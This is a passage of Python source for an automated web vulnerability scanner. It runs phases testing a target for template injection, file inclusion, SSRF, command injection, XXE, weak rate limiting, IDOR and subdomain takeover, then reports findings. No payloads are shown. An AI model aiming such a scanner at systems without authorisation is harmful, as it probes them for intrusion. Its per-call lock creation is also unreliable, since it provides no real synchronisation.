        self.log(f"\n[*] Phase I: SSTI testing...")
        ssti_checker  = SSTIChecker(self.session, self.timeout, self.log)
        ssti_findings = []

        def check_ssti(url):
            params = list(param_map.get(url, []))
            res    = ssti_checker.check(url, params)
            if res:
                with threading.Lock():
                    ssti_findings.extend(res)
                    for f in res:
                        self._log_finding('ssti', f)

        with cf.ThreadPoolExecutor(max_workers=min(self.threads, 6)) as pool:
            futs = {pool.submit(check_ssti, u): u for u in all_urls[:25]}
            cf.wait(futs, timeout=90)
            for f in futs: f.cancel()

        self.findings['ssti'] = ssti_findings
        self.log(f"  [+] SSTI: {len(ssti_findings)} issues found")

        # ── 10. LFI ───────────────────────────────────────────────────────────
        self.log(f"\n[*] Phase J: LFI / Path traversal testing...")
        lfi_checker  = LFIChecker(self.session, self.timeout, self.log)
        lfi_findings = []

        def check_lfi(url):
            params = list(param_map.get(url, []))
            res    = lfi_checker.check(url, params)
            if res:
                with threading.Lock():
                    lfi_findings.extend(res)
                    for f in res:
                        self._log_finding('lfi', f)

        with cf.ThreadPoolExecutor(max_workers=min(self.threads, 6)) as pool:
            futs = {pool.submit(check_lfi, u): u for u in all_urls[:25]}
            cf.wait(futs, timeout=90)
            for f in futs: f.cancel()

        self.findings['lfi'] = lfi_findings
        self.log(f"  [+] LFI: {len(lfi_findings)} issues found")

        # ── 11. SSRF ──────────────────────────────────────────────────────────
        self.log(f"\n[*] Phase K: SSRF testing...")
        ssrf_checker  = SSRFChecker(self.session, self.timeout, self.log)
        ssrf_findings = []

        def check_ssrf(url):
            params = list(param_map.get(url, []))
            res    = ssrf_checker.check(url, params)
            if res:
                with threading.Lock():
                    ssrf_findings.extend(res)
                    for f in res:
                        self._log_finding('ssrf', f)

        with cf.ThreadPoolExecutor(max_workers=min(self.threads, 6)) as pool:
            futs = {pool.submit(check_ssrf, u): u for u in all_urls[:25]}
            cf.wait(futs, timeout=90)
            for f in futs: f.cancel()

        self.findings['ssrf'] = ssrf_findings
        self.log(f"  [+] SSRF: {len(ssrf_findings)} issues found")

        # ── 12. Command Injection ─────────────────────────────────────────────
        self.log(f"\n[*] Phase L: Command injection testing...")
        cmdi_checker  = CMDIChecker(self.session, self.timeout, self.log)
        cmdi_findings = []

        def check_cmdi(url):
            params = list(param_map.get(url, []))
            res    = cmdi_checker.check(url, params)
            if res:
                with threading.Lock():
                    cmdi_findings.extend(res)
                    for f in res:
                        self._log_finding('cmdi', f)

        with cf.ThreadPoolExecutor(max_workers=min(self.threads, 6)) as pool:
            futs = {pool.submit(check_cmdi, u): u for u in all_urls[:20]}
            cf.wait(futs, timeout=90)
            for f in futs: f.cancel()

        self.findings['cmdi'] = cmdi_findings
        self.log(f"  [+] Command injection: {len(cmdi_findings)} issues found")

        # ── 13. XXE ───────────────────────────────────────────────────────────
        self.log(f"\n[*] Phase M: XXE injection testing...")
        xxe_checker  = XXEChecker(self.session, self.timeout, self.log)
        xxe_findings = []
        xml_endpoints = [u for u in all_urls if any(
            kw in u for kw in ['/xml', '/soap', '/api', '/graphql', '/upload']
        )][:10] or [self.base_url]

        for url in xml_endpoints:
            res = xxe_checker.check(url)
            xxe_findings.extend(res)
            for f in res:
                self._log_finding('xxe', f)

        self.findings['xxe'] = xxe_findings
        self.log(f"  [+] XXE: {len(xxe_findings)} issues found")

        # ── 14. Rate Limiting ─────────────────────────────────────────────────
        self.log(f"\n[*] Phase N: Rate limiting check on auth endpoints...")
        rl_checker  = RateLimitChecker(self.session, self.timeout, self.log)
        rl_findings = []
        auth_endpoints = [u for u in all_urls if any(
            kw in u.lower() for kw in ['/login', '/signin', '/auth', '/token', '/password']
        )][:3]
        if not auth_endpoints:
            auth_endpoints = [self.base_url + '/login', self.base_url + '/api/auth']

        for url in auth_endpoints:
            res = rl_checker.check(url)
            rl_findings.extend(res)
            for f in res:
                self._log_finding('rate_limit', f)

        self.findings['rate_limiting'] = rl_findings
        self.log(f"  [+] Rate limiting: {len(rl_findings)} issues found")

        # ── 15. IDOR ──────────────────────────────────────────────────────────
        self.log(f"\n[*] Phase O: IDOR / parameter tampering...")
        idor_checker  = IDORChecker(self.session, self.timeout, self.log)
        idor_findings = []
        numeric_urls  = [u for u in all_urls if re.search(r'[?&]\w+=\d+', u)][:15]

        for url in numeric_urls:
            params = list(param_map.get(url, []))
            res    = idor_checker.check(url, params)
            idor_findings.extend(res)
            for f in res:
                self._log_finding('idor', f)

        self.findings['idor'] = idor_findings
        self.log(f"  [+] IDOR: {len(idor_findings)} issues found")

        # ── 16. Subdomain Takeover ────────────────────────────────────────────
        if subdomains:
            self.log(f"\n[*] Phase P: Subdomain takeover ({len(subdomains)} subdomains)...")
            takeover_checker  = SubdomainTakeoverChecker(self.session, self.timeout, self.log)
            takeover_findings = takeover_checker.check_subdomains(subdomains,
                urlparse(self.base_url).netloc)
            self.findings['subdomain_takeover'] = takeover_findings
            for f in takeover_findings:
                self._log_finding('subdomain_takeover', f)
            self.log(f"  [+] Subdomain takeover: {len(takeover_findings)} issues found")

        # ── Summary ───────────────────────────────────────────────────────────
        elapsed   = time.time() - t0
        total     = sum(len(v) for k, v in self.findings.items() if k != 'waf')
        critical  = sum(1 for fl in self.findings.values()
                        for f in (fl if isinstance(fl, list) else [])
                        if isinstance(f, dict) and f.get('severity') == 'CRITICAL')
        high      = sum(1 for fl in self.findings.values()
                        for f in (fl if isinstance(fl, list) else [])
                        if isinstance(f, dict) and f.get('severity') == 'HIGH')

        self.log(f"\n[✓] Advanced scan complete in {elapsed:.1f}s")
        self.log(f"    Total findings : {total}")
        self.log(f"    CRITICAL       : {critical}")
        self.log(f"    HIGH           : {high}")

        return dict(self.findings)

    def get_summary(self) -> dict:
        counts = {k: len(v) for k, v in self.findings.items()}
        total  = sum(counts.values())
        return {'total': total, 'by_category': counts, 'findings': dict(self.findings)}


# =============================================================================
# STANDALONE CLI
# =============================================================================

def main():
    ap = argparse.ArgumentParser(description='JS Scout Advanced Vulnerability Scanner — standalone')
    ap.add_argument('target',           help='Target base URL')
    ap.add_argument('--output', '-o',   default='adv_output', help='Output directory')
    ap.add_argument('--threads', '-t',  type=int, default=10)
    ap.add_argument('--timeout',        type=int, default=10)
    ap.add_argument('--cookies', '-c',  default=None, help='Cookies: name=val; name2=val2')
    args = ap.parse_args()

    session = requests.Session()
    session.verify = False
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
    })
    if args.cookies:
        for pair in args.cookies.split(';'):
            pair = pair.strip()
            if '=' in pair:
                k, _, v = pair.partition('=')
                session.cookies.set(k.strip(), v.strip())

    scanner = AdvancedScanner(
        args.target,
        session=session,
        threads=args.threads,
        timeout=args.timeout,
    )
    results = scanner.run_all()
    summary = scanner.get_summary()

    out_dir = Path(args.output)
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / 'advanced_findings.json').write_text(
        json.dumps(results, indent=2, default=str), encoding='utf-8'
    )

    print(f"\n[✓] Results saved to {out_dir / 'advanced_findings.json'}")
    print(f"\nSummary:")
    for cat, count in summary['by_category'].items():
        if count:
            print(f"  {cat:25s}: {count}")


if __name__ == '__main__':
    main()
